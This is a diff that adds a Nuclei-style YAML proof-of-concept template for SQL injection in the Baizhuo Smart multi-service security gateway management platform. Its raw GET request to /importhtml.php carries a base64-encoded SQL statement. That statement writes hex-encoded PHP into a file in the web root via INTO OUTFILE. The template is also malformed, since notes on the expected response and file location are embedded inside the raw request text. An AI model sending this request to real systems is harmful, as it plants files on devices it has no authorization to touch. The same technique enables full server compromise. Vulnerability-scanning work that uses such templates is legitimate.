@@ -1,0 +1,34 @@
+id: poc-gn5e6pt8pzguypmp
+info:
+  name: 百卓智能Smart多业务安全网关智能管理平台SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gn5e6pt8pzguypmp'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gn5e6pt8pzguypmp
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M0MzRjcwNjg3MDIwNjU2MzY4NkYyMDI3QTA0MzU2NDUyRDMyMzAzMjMzMkQzNDMxMzIzMDIwNzQ2NTczNzQyNzNCMjAzRjNFIGludG8gb3V0ZmlsZSAnL3Vzci9oZGRvY3MvbnNnL2FwcC90ZXN0LnBocCc= HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    html
+
+
+    # 上传文件定位
+
+    /app/test.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
